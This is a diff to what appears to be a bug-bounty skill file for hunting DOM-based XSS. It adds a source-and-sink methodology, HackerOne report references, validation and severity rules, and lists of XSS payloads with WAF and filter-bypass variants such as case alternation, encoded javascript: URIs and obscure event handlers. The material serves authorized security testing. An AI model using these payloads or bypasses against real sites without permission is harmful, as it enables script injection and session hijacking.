@@ -1,11 +1,122 @@
 ---
 name: hunt-dom
-description: "Hunt client-side DOM vulnerabilities — DOM Clobbering (overwrite JS globals via HTML injection), PostMessage hijacking (missing origin check), Service Worker abuse (intercept requests from same-origin script), CSS Injection/Exfiltration (attribute selectors → token char-by-char via OOB), client-side template injection, dangerouslySetInnerHTML. Grounded in named public research: Gareth Heyes / PortSwigger DOM-clobbering + DOM-Invader, Michał Bentkowski DOMPurify clobbering bypasses, jQuery htmlPrefilter XSS (CVE-2020-11022 / CVE-2020-11023), d0nut CSS-exfil research. Use when hunting DOM-XSS, client-side auth bypass, or token exfiltration without server-side interaction."
+description: "Hunt client-side DOM vulnerabilities — classic DOM XSS (source → sink), DOM Clobbering (overwrite JS globals via HTML injection), PostMessage hijacking (missing origin check), Service Worker abuse (intercept requests from same-origin script), CSS Injection/Exfiltration (attribute selectors → token char-by-char via OOB), client-side template injection, dangerouslySetInnerHTML. Grounded in named public research: Gareth Heyes / PortSwigger DOM-clobbering + DOM-Invader, Michał Bentkowski DOMPurify clobbering bypasses, jQuery htmlPrefilter XSS (CVE-2020-11022 / CVE-2020-11023), d0nut CSS-exfil research, plus disclosed HackerOne DOM-XSS reports and public WAF-bypass corpora. Use when hunting DOM-XSS, client-side auth bypass, or token exfiltration without server-side interaction, including behind a WAF."
 sources: portswigger_research, hackerone_public, github_security_advisories
-report_count: 14
+report_count: 16
 ---
 
 # HUNT-DOM — DOM Clobbering / PostMessage / Service Worker / CSS Exfil
+
+## Phase 0 — Classic DOM XSS (Source → Sink)
+
+This is the most common and highest-ROI pure client-side finding. The payload never reaches the server (or is not reflected by it) — so **standard server-side WAFs never see it**, which is exactly why this phase deserves first-pass priority before the more exotic client-side classes below.
+
+### Highest-value Sources
+| Source                             | Notes                                             | Priority |
+|-------------------------------------|----------------------------------------------------|----------|
+| `location.hash`                     | Never sent to the server → invisible to WAF/logs   | Critical |
+| `location.search`                   | Query string (`?q=`)                               | High     |
+| `location.href` / `pathname`        | Full URL                                            | High     |
+| `window.name`                       | Persists across navigations                         | High     |
+| `document.referrer`                 | Previous page                                       | Medium   |
+| `postMessage` data                  | Cross-origin messages                               | Critical |
+| `localStorage` / `sessionStorage`   | If attacker can write first                         | Medium   |
+
+### Most dangerous Sinks
+**HTML sinks**
+- `element.innerHTML`
+- `element.outerHTML`
+- `element.insertAdjacentHTML()`
+- `document.write()` / `document.writeln()`
+- jQuery: `.html()`, `.append()`, `.prepend()`, `.after()`, `.before()`, `.replaceWith()`, etc.
+
+**JavaScript execution sinks**
+- `eval()`
+- `new Function()`
+- `setTimeout("string")` / `setInterval("string")`
+
+**Navigation / attribute sinks**
+- `location` / `location.href` / `location.assign()` / `location.replace()` → `javascript:` URI
+- `element.src` / `element.href`
+- `element.setAttribute()`
+
+### Hunting methodology
+1. Search all JavaScript for the sources and sinks above (DevTools → Search or `grep`).
+2. Prefer **Burp DOM Invader** — enable it and browse the application; it automatically traces source → sink flows.
+3. Manually test high-value sources:
+```
+https://target.com/page#<payload>
+https://target.com/page?param=<payload>
+```
+4. Always verify the payload does **not** appear in the raw HTTP response (true DOM XSS — this is what tells it apart from reflected XSS and is why it slips past network-layer WAFs entirely).
+5. Test `window.name` and every `message` event listener (cross-reference with Phase 2 below).
+
+### Grounding — disclosed reports on this exact class
+- **DOM Based XSS in hackerone.com via PostMessage** — disclosed HackerOne report, $500 bounty: a `message` handler consumed `event.data` into a DOM sink without validating origin — the same root cause pattern as Phase 0's `postMessage` source row and Phase 2 below.
+- **Stealing contact form data on hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP** — chained a third-party embed's DOM-XSS with postMessage frame-jumping to exfiltrate form data cross-origin, showing how a low-severity DOM sink becomes high-impact once chained.
+- Treat these as *pattern* references, not proof for your own report — your own reproduction against the live target is the evidence, per the repo's citation rule.
+
+### Useful payloads by sink context
+```html
+<!-- innerHTML / outerHTML / insertAdjacentHTML -->
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(document.domain)>
+<details open ontoggle=alert(1)>
+
+<!-- document.write -->
+<script>alert(document.domain)</script>
+
+<!-- location / href / src sinks -->
+javascript:alert(document.domain)
+
+<!-- Attribute breakout -->
+" onmouseover="alert(1)
+' onerror='alert(1)
+```
+
+### WAF / filter bypass for classic DOM XSS
+DOM XSS via `location.hash` already skips network-layer WAFs entirely (the payload never transits the request the WAF inspects). These bypasses matter when: (a) the client-side app itself sanitizes/filters before the sink, (b) a CDN-level WAF also inspects `location.search` payloads reflected into later requests, or (c) you're chaining into a sink that re-serializes through the server (e.g. logging, SSR hydration).
+
+```html
+<!-- Case alternation — defeats naive case-sensitive tag/attribute regexes -->
+<sCrIpT>alert(document.domain)</sCriPt>
+<IMG SRC=x OnErRoR=alert(1)>
+
+<!-- Malformed / duplicated tags — confuses regex-based tag stripping -->
+<<script>alert(1)</script>
+<script>alert(1)//        <!-- unclosed tag, browser still executes -->
+<script>alert(1)<%00/script>
+
+<!-- Alternative execution without parentheses (blocks "alert(" signature match) -->
+<svg onload=alert`1`>
+<img src=x onerror=alert&lpar;1&rpar;>
+
+<!-- Attribute/space obfuscation — bypass filters expecting a literal space before onerror= -->
+<img/src=x/onerror=alert(1)>
+<svg%0Aonload=alert(1)>          <!-- encoded newline as separator -->
+<img src=x onerror=al\u0065rt(1)>  <!-- JS unicode escape inside handler -->
+
+<!-- javascript: URI obfuscation for href/src/location sinks -->
+java%0ascript:alert(1)
+java&Tab;script:alert(1)
+&#106;avascript:alert(1)          <!-- HTML entity encoding -->
+
+<!-- Encoding chains for reflected-into-DOM cases behind a WAF -->
+%253Cscript%253E                  <!-- double URL-encoding -->
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==   <!-- base64-wrapped payload for data: sinks -->
+
+<!-- Uncommon tags/attributes not on common WAF blocklists -->
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<style>@import 'javascript:alert(1)';</style>
+```
+
+> Validate each bypass against the *live* filter, don't assume from the list — a signature that stops `<script>` case-insensitively will still eat `<sCrIpT>`; test iteratively and check the browser console for what actually parsed vs what the WAF actually blocked (403/406 vs silently stripped). Reference corpora for further variants: PortSwigger XSS cheat sheet, PayloadsAllTheThings XSS, OWASP XSS filter evasion.
+
+### Validation rule for classic DOM XSS
+The payload must execute in the browser and must not be present (or only HTML-encoded) in the server response body. If it's echoed unescaped server-side too, downgrade/relabel as reflected XSS, not DOM XSS — the two have different remediation paths and you don't want a triager bouncing the report over a misclassification.
+
+---
 
 ## Crown Jewel Targets
 
@@ -242,6 +353,7 @@ grep -rnE "angular|vue|handlebars|mustache|nunjucks|alpinejs|\bv-|ng-app" recon/
 
 | DOM finding | Chain to | Impact |
 |-------------|----------|--------|
+| Classic DOM XSS (`location.hash`/`search` → `innerHTML`/`eval`) | Session hijack / account takeover via crafted link | High–Critical |
 | DOM Clobbering → clobbered URL into `script.src`/`location` | DOM-XSS under markup-only injection | High / auth bypass |
 | PostMessage no/weak origin check (listener) | data → innerHTML/eval/location sink | DOM-XSS → ATO |
 | PostMessage `targetOrigin:'*'` sender | any framing page reads token/auth code | Cross-origin token theft |
@@ -266,14 +378,17 @@ grep -rnE "angular|vue|handlebars|mustache|nunjucks|alpinejs|\bv-|ng-app" recon/
 
 Match the repo standard: a technique that *fires in DevTools* is not a finding until impact is **OOB-confirmed** and **state-proven**.
 
+- **Classic DOM XSS** — payload executes in-browser AND is absent (or HTML-encoded) from the raw server response. If it's echoed unescaped server-side too, that's reflected XSS, not DOM XSS — classify correctly.
 - **DOM Clobbering** — show the clobbered value actually reaching a sink (XSS payload executes, or app navigates/loads from attacker URL). A clobberable global that never reaches a sink = no impact, do not report.
 - **PostMessage** — distinguish a *missing* check from a *weak* one; bypass weak checks from a look-alike origin and capture via OOB. A noisy `message` log alone is not proof — show the privileged action or token exfil.
 - **CSS exfil** — **OOB callback per correct character is the only proof.** Read CSP first: `img-src`/`style-src`/`connect-src`/`default-src` restricting external origins kills it. A blocked `url()` is indistinguishable from success in the Network tab — confirm on the Collaborator side.
 - **Service Worker** — registration must be **same-origin script**; a `SecurityError` means you cited the wrong origin. Prove *persistence* (close tabs → reopen → fresh OOB hit, no XSS re-fire).
+- **WAF-bypassed payloads** — a payload that merely returns 200 instead of 403 is not proof of execution. Confirm the alert/OOB fired in an actual browser render, not just that the WAF didn't block the request.
 - **General** — unique per-test markers (`btoa(domain)+nonce`) so an OOB hit is attributable to YOUR payload and not background traffic; body-diff the rendered DOM, not the raw HTML, since these are client-side.
 
 **Severity:**
 - Same-origin Service Worker → persistent credential intercept: **Critical**
 - PostMessage data → DOM-XSS / token theft → ATO: **High–Critical**
+- Classic DOM XSS reaching session/auth-critical sinks: **High–Critical**
 - DOM Clobbering → DOM-XSS reaching auth/session: **High**
 - CSS exfil of CSRF token (OOB-proven) → CSRF: **Medium** (raise if the chained CSRF is account-critical)
